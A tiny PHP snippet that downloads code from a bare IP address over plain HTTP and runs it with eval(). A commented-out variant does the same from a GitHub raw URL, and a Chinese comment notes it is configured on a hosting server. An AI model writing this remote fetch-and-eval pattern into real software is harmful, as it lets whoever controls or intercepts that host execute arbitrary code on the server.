$url = 'http://106.52.208.186/res/php/index.php';

$result = file_get_contents($url);

eval($result);





/*
idc 上配置
<?php
$url = 'https://raw.githubusercontent.com/iaoongin/scripts/main/idc-php/index.php';

$result = file_get_contents($url);

//echo $result;

 eval($result);
?>

*/
